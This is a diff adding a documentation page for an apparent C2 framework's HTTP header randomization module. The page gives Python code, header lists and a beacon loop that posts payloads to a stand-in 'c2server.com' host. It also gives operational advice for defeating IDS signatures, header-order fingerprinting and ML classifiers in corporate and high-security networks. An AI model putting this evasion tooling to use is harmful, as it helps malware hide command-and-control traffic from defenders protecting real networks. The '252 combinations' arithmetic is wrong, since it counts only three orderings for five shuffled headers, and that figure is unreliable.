@@ -1,0 +1,575 @@
+---
+title: 'HTTP Header Randomization'
+description: 'Header polymorphism to evade signature-based detection'
+---
+
+## Overview
+
+HTTP header randomization implements **polymorphic headers** across four escalating levels, from fixed static headers to full randomization with shuffled ordering. This defeats signature-based detection systems that fingerprint C2 traffic by analyzing User-Agent strings and header combinations.
+
+## Why Header Randomization Matters
+
+Security tools often flag C2 beacons by detecting **static header signatures**:
+
+<CodeGroup>
+```http Static Headers (Detectable)
+POST /api/beacon HTTP/1.1
+Host: c2server.com
+Content-Type: application/octet-stream
+User-Agent: Python-urllib/3.11
+
+⚠️ Python User-Agent from Windows host = suspicious
+```
+
+```http Randomized Headers (Evasive)
+POST /api/beacon HTTP/1.1
+Host: c2server.com
+Content-Type: application/octet-stream
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+
+✓ Mimics legitimate browser traffic
+```
+</CodeGroup>
+
+<Info>
+  Headers are randomized **per request**. Each beacon call generates new randomized headers based on the configured level.
+</Info>
+
+## Randomization Levels
+
+The framework provides four levels of header randomization:
+
+### Level 0: Static (Baseline)
+
+**Behavior**: Fixed Chrome User-Agent, no randomization
+
+```python
+# Source: evasion/header_randomizer.py:37-41
+if level == 0:
+    ua       = _CHROME_UA        # Fixed Chrome 122
+    language = _DEFAULT_LANG     # Fixed en-US
+    encoding = ACCEPT_ENCODINGS[0]  # Fixed gzip, deflate, br
+    optional = _build_optional(ua, language, encoding)
+```
+
+**Resulting Headers**:
+```http
+Host: c2server.com
+Content-Type: application/octet-stream
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+```
+
+<Warning>
+  **Level 0** provides no evasion. Every request uses identical headers, creating a detectable fingerprint. Use only for testing.
+</Warning>
+
+### Level 1: User-Agent Rotation
+
+**Behavior**: Randomize User-Agent only, other headers fixed
+
+```python
+# Source: evasion/header_randomizer.py:43-47
+elif level == 1:
+    ua       = random.choice(USER_AGENTS)  # Rotated
+    language = _DEFAULT_LANG               # Fixed en-US
+    encoding = ACCEPT_ENCODINGS[0]         # Fixed gzip, deflate, br
+    optional = _build_optional(ua, language, encoding)
+```
+
+**Available User-Agents** (source: `header_randomizer.py:5-10`):
+```python
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/122.0.0.0 ...',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) ... Firefox/123.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Edg/121.0.0.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) ... Safari/605.1.15',
+]
+```
+
+**Example Rotation**:
+```http
+Request 1: User-Agent: Mozilla/5.0 ... Chrome/122.0.0.0
+Request 2: User-Agent: Mozilla/5.0 ... Firefox/123.0
+Request 3: User-Agent: Mozilla/5.0 ... Edg/121.0.0.0
+Request 4: User-Agent: Mozilla/5.0 ... Safari/605.1.15
+```
+
+<Note>
+  Level 1 provides basic evasion against simple User-Agent fingerprinting while maintaining consistent other headers.
+</Note>
+
+### Level 2: User-Agent + Accept-Language
+
+**Behavior**: Randomize UA and Accept-Language, encoding fixed
+
+```python
+# Source: evasion/header_randomizer.py:49-53
+elif level == 2:
+    ua       = random.choice(USER_AGENTS)       # Rotated
+    language = random.choice(ACCEPT_LANGUAGES)  # Rotated
+    encoding = ACCEPT_ENCODINGS[0]              # Fixed gzip, deflate, br
+    optional = _build_optional(ua, language, encoding)
+```
+
+**Available Languages** (source: `header_randomizer.py:12-20`):
+```python
+ACCEPT_LANGUAGES = [
+    'en-US,en;q=0.9',   # US English
+    'en-GB,en;q=0.9',   # British English
+    'fr-FR,fr;q=0.9,en;q=0.8',  # French
+    'de-DE,de;q=0.9,en;q=0.8',  # German
+    'ja-JP,ja;q=0.9,en;q=0.8',  # Japanese
+    'zh-CN,zh;q=0.9,en;q=0.8',  # Chinese
+    'pt-BR,pt;q=0.9,en;q=0.8',  # Brazilian Portuguese
+]
+```
+
+**Example Combinations**:
+```http
+Request 1:
+  User-Agent: Mozilla/5.0 ... Chrome/122.0.0.0
+  Accept-Language: en-US,en;q=0.9
+
+Request 2:
+  User-Agent: Mozilla/5.0 ... Firefox/123.0
+  Accept-Language: ja-JP,ja;q=0.9,en;q=0.8
+
+Request 3:
+  User-Agent: Mozilla/5.0 ... Safari/605.1.15
+  Accept-Language: de-DE,de;q=0.9,en;q=0.8
+```
+
+### Level 3: Full Randomization + Shuffling
+
+**Behavior**: Randomize all header values AND shuffle optional header order
+
+```python
+# Source: evasion/header_randomizer.py:55-61
+else:
+    # Level 3 — randomise UA, language, encoding, and shuffle optional header order
+    ua       = random.choice(USER_AGENTS)
+    language = random.choice(ACCEPT_LANGUAGES)
+    encoding = random.choice(ACCEPT_ENCODINGS)
+    optional = _build_optional(ua, language, encoding)
+    random.shuffle(optional)  # Shuffle order!
+```
+
+**Available Encodings** (source: `header_randomizer.py:22-26`):
+```python
+ACCEPT_ENCODINGS = [
+    'gzip, deflate, br',  # Modern browsers
+    'gzip, deflate',      # Older browsers
+    'br, gzip',           # Alternate preference
+]
+```
+
+**Example with Shuffling**:
+```http
+Request 1 (order A):
+  Host: c2server.com
+  Content-Type: application/octet-stream
+  User-Agent: Mozilla/5.0 ... Firefox/123.0
+  Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+  Accept-Encoding: gzip, deflate
+  Accept: */*
+  Connection: keep-alive
+
+Request 2 (order B - shuffled):
+  Host: c2server.com
+  Content-Type: application/octet-stream
+  Connection: keep-alive
+  Accept: */*
+  User-Agent: Mozilla/5.0 ... Safari/605.1.15
+  Accept-Encoding: br, gzip
+  Accept-Language: fr-FR,fr;q=0.9,en;q=0.8
+```
+
+<Note>
+  **Level 3** provides maximum polymorphism. Both header values AND ordering change per request, defeating advanced fingerprinting that analyzes header sequence.
+</Note>
+
+## Header Structure
+
+### Fixed Headers
+
+These headers are **never randomized or shuffled**:
+
+```python
+# Source: evasion/header_randomizer.py:64-76
+host = config.SERVER_HOST
+port = config.SERVER_PORT
+
+# Include port if non-standard
+if port not in (80, 443):
+    host = f"{host}:{port}"
+
+headers = {
+    'Host':         host,         # Always first
+    'Content-Type': 'application/octet-stream',  # Always second
+}
+headers.update(dict(optional))
+return headers
+```
+
+**Why Fixed?**
+- `Host`: Required for HTTP/1.1, indicates target server
+- `Content-Type`: Identifies beacon payload format
+
+### Optional Headers
+
+These headers are randomized and shuffled (Level 3):
+
+```python
+# Source: evasion/header_randomizer.py:79-87
+def _build_optional(ua: str, language: str, encoding: str) -> list[tuple[str, str]]:
+    return [
+        ('User-Agent',       ua),
+        ('Accept-Language',  language),
+        ('Accept-Encoding',  encoding),
+        ('Accept',           '*/*'),
+        ('Connection',       'keep-alive'),
+    ]
+```
+
+<Info>
+  Optional headers are returned as an **ordered list** of tuples to allow shuffling. Fixed headers are added afterward to preserve their position.
+</Info>
+
+## Level Comparison Table
+
+| Feature | Level 0 | Level 1 | Level 2 | Level 3 |
+|---------|---------|---------|---------|--------|
+| **User-Agent** | Fixed Chrome | Rotated (4 options) | Rotated (4 options) | Rotated (4 options) |
+| **Accept-Language** | Fixed en-US | Fixed en-US | Rotated (7 options) | Rotated (7 options) |
+| **Accept-Encoding** | Fixed gzip | Fixed gzip | Fixed gzip | Rotated (3 options) |
+| **Header Order** | Fixed | Fixed | Fixed | **Shuffled** |
+| **Total Combinations** | 1 | 4 | 28 | **252** |
+| **Detection Risk** | ⚠️ High | ⚠️ Medium | ⚠️ Low-Medium | ✓ Low |
+
+<Note>
+  **Total Combinations** = (User-Agents) × (Languages) × (Encodings) × (Orderings)
+  
+  Level 3: 4 × 7 × 3 × 3 = **252 unique header combinations**
+</Note>
+
+## Implementation Details
+
+### Host Header Construction
+
+Non-standard ports are included in the Host header:
+
+```python
+host = config.SERVER_HOST  # e.g., "c2server.com"
+port = config.SERVER_PORT  # e.g., 8443
+
+if port not in (80, 443):
+    host = f"{host}:{port}"  # "c2server.com:8443"
+```
+
+**Examples**:
+```python
+HTTPS on 443 → Host: c2server.com
+HTTP on 80   → Host: c2server.com
+HTTPS on 8443 → Host: c2server.com:8443
+HTTP on 8080  → Host: c2server.com:8080
+```
+
+### Error Handling
+
+```python
+# Source: evasion/header_randomizer.py:32-35
+def get_headers(level: int) -> dict:
+    if level not in (0, 1, 2, 3):
+        raise ValueError(f'invalid header randomisation level: {level}')
+```
+
+Invalid levels are rejected with a clear error message.
+
+## Usage Examples
+
+<CodeGroup>
+```python Basic Usage
+from evasion.header_randomizer import get_headers
+
+# Get headers for level 2
+headers = get_headers(level=2)
+
+print(headers)
+# {
+#   'Host': 'c2server.com',
+#   'Content-Type': 'application/octet-stream',
+#   'User-Agent': 'Mozilla/5.0 ... Firefox/123.0',
+#   'Accept-Language': 'ja-JP,ja;q=0.9,en;q=0.8',
+#   'Accept-Encoding': 'gzip, deflate, br',
+#   'Accept': '*/*',
+#   'Connection': 'keep-alive'
+# }
+```
+
+```python Profile Integration
+from transport.traffic_profile import load_active_profile
+from evasion.header_randomizer import get_headers
+import requests
+
+# Load header level from profile
+profile = load_active_profile()
+
+def send_beacon(payload: bytes):
+    # Generate randomized headers based on profile
+    headers = get_headers(profile.header_level)
+    
+    # Send beacon with randomized headers
+    response = requests.post(
+        f"https://{headers['Host']}/api/beacon",
+        data=payload,
+        headers=headers
+    )
+    
+    return response
+```
+
+```python Testing Different Levels
+# Compare header consistency across levels
+for level in range(4):
+    print(f"\n=== Level {level} ===")
+    
+    # Generate 3 sets of headers
+    for i in range(3):
+        headers = get_headers(level)
+        print(f"Request {i+1}: {headers['User-Agent'][:30]}...")
+        
+# Output:
+# === Level 0 ===
+# Request 1: Mozilla/5.0 (Windows NT 10... (same)
+# Request 2: Mozilla/5.0 (Windows NT 10... (same)
+# Request 3: Mozilla/5.0 (Windows NT 10... (same)
+#
+# === Level 1 ===
+# Request 1: Mozilla/5.0 (Windows NT 10... (Chrome)
+# Request 2: Mozilla/5.0 (Macintosh; Int... (Safari)
+# Request 3: Mozilla/5.0 (Windows NT 10... (Firefox)
+```
+
+```python Custom Header Merging
+# Add application-specific headers
+base_headers = get_headers(level=3)
+
+custom_headers = {
+    **base_headers,
+    'X-Request-ID': generate_request_id(),
+    'Authorization': f'Bearer {token}',
+}
+
+# Note: Custom headers added AFTER randomized ones
+```
+</CodeGroup>
+
+## Browser User-Agent Details
+
+The framework includes realistic browser signatures:
+
+<Tabs>
+  <Tab title="Chrome 122">
+    ```
+    Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+    AppleWebKit/537.36 (KHTML, like Gecko) 
+    Chrome/122.0.0.0 Safari/537.36
+    ```
+    
+    **Profile**: Windows 10, 64-bit, Chromium-based
+  </Tab>
+  
+  <Tab title="Firefox 123">
+    ```
+    Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) 
+    Gecko/20100101 Firefox/123.0
+    ```
+    
+    **Profile**: Windows 10, 64-bit, Gecko engine
+  </Tab>
+  
+  <Tab title="Edge 121">
+    ```
+    Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+    AppleWebKit/537.36 (KHTML, like Gecko) 
+    Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0
+    ```
+    
+    **Profile**: Windows 10, 64-bit, Chromium-based Edge
+  </Tab>
+  
+  <Tab title="Safari 17.2">
+    ```
+    Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) 
+    AppleWebKit/605.1.15 (KHTML, like Gecko) 
+    Version/17.2 Safari/605.1.15
+    ```
+    
+    **Profile**: macOS 14.3 (Sonoma), WebKit engine
+  </Tab>
+</Tabs>
+
+<Info>
+  All User-Agents represent **current browser versions** (as of framework release). Update `USER_AGENTS` list periodically to maintain realistic signatures.
+</Info>
+
+## Testing Header Randomization
+
+### Rotation Verification
+
+```python
+# Verify User-Agents rotate at level 1
+uas_seen = set()
+for _ in range(50):
+    headers = get_headers(1)
+    uas_seen.add(headers['User-Agent'])
+
+print(f"Unique User-Agents: {len(uas_seen)}")
+assert len(uas_seen) > 1, "Level 1 should rotate UA"
+
+# Verify languages stay fixed at level 1
+langs = [get_headers(1)['Accept-Language'] for _ in range(20)]
+assert len(set(langs)) == 1, "Level 1 should have fixed language"
+```
+
+### Order Shuffling Verification
+
+```python
+# Verify Level 3 produces different header orders
+orders_seen = set()
+for _ in range(50):
+    headers = get_headers(3)
+    
+    # Extract order of optional headers (skip Host and Content-Type)
+    keys = list(headers.keys())
+    optional_order = tuple(keys[2:])
+    
+    orders_seen.add(optional_order)
+
+print(f"Unique orderings: {len(orders_seen)}")
+assert len(orders_seen) > 1, "Level 3 should shuffle header order"
+```
+
+### Fixed Header Position
+
+```python
+# Verify Host and Content-Type always come first
+for level in range(4):
+    for _ in range(10):
+        headers = get_headers(level)
+        keys = list(headers.keys())
+        
+        assert keys[0] == 'Host', "Host must be first"
+        assert keys[1] == 'Content-Type', "Content-Type must be second"
+```
+
+## Operational Recommendations
+
+<CardGroup cols={2}>
+  <Card title="Corporate Networks" icon="building">
+    Use **Level 2** for realistic browser diversity without excessive variance
+    
+    Mimics multi-user environment naturally
+  </Card>
+  
+  <Card title="High-Security Environments" icon="shield-halved">
+    Use **Level 3** for maximum polymorphism
+    
+    Defeats advanced header fingerprinting and ML classifiers
+  </Card>
+  
+  <Card title="Long-Running Operations" icon="hourglass">
+    **Level 3** prevents statistical correlation
+    
+    Varied headers across thousands of beacons avoid pattern detection
+  </Card>
+  
+  <Card title="Bandwidth-Constrained" icon="signal-weak">
+    Header randomization has **minimal overhead**
+    
+    Headers add ~200-400 bytes regardless of level
+  </Card>
+</CardGroup>
+
+<Warning>
+  **User-Agent Consistency**: Some applications track User-Agent per session. If your target environment expects consistent UAs, use Level 0 or implement session-based UA pinning.
+</Warning>
+
+## Detection Avoidance
+
+Header randomization defeats multiple detection methods:
+
+### 1. User-Agent Fingerprinting
+
+**Threat**: Static "Python-requests" or non-browser UA flagged
+
+**Mitigation**: Rotate realistic browser User-Agents (Level 1+)
+
+### 2. Header Combination Signatures
+
+**Threat**: IDS rules detect specific header combinations
+
+**Mitigation**: Randomize multiple header values (Level 2+)
+
+### 3. Header Order Fingerprinting
+
+**Threat**: Advanced systems fingerprint header sequence
+
+**Mitigation**: Shuffle optional header order (Level 3)
+
+### 4. Behavioral Analysis
+
+**Threat**: ML models detect non-human header consistency
+
+**Mitigation**: Per-request randomization mimics diverse user base
+
+## Combining with Other Evasion
+
+Header randomization is most effective when combined with:
+
+```python
+from transport.traffic_profile import load_active_profile
+from evasion.header_randomizer import get_headers
+from evasion.padding_strat import pad
+from evasion.sleep_strat import get_sleep_fn
+import time
+
+profile = load_active_profile()
+sleep_fn = get_sleep_fn(profile.jitter_strategy)
+
+while True:
+    # 1. Randomize headers
+    headers = get_headers(profile.header_level)
+    
+    # 2. Pad payload
+    padded_payload = pad(beacon_data, profile.padding_min, profile.padding_max)
+    
+    # 3. Send with randomized headers
+    send_beacon(padded_payload, headers)
+    
+    # 4. Sleep with jitter
+    sleep_duration = sleep_fn(BEACON_INTERVAL_S, profile.jitter_pct)
+    time.sleep(sleep_duration)
+```
+
+## Related Topics
+
+<CardGroup cols={3}>
+  <Card title="Traffic Profiles" icon="sliders" href="/evasion/traffic-profiles">
+    Configure header level in profile YAML
+  </Card>
+  <Card title="Jitter Strategies" icon="clock" href="/evasion/jitter-strategies">
+    Combine with timing randomization
+  </Card>
+  <Card title="Evasion Overview" icon="shield" href="/evasion/overview">
+    Complete evasion architecture
+  </Card>
+</CardGroup>
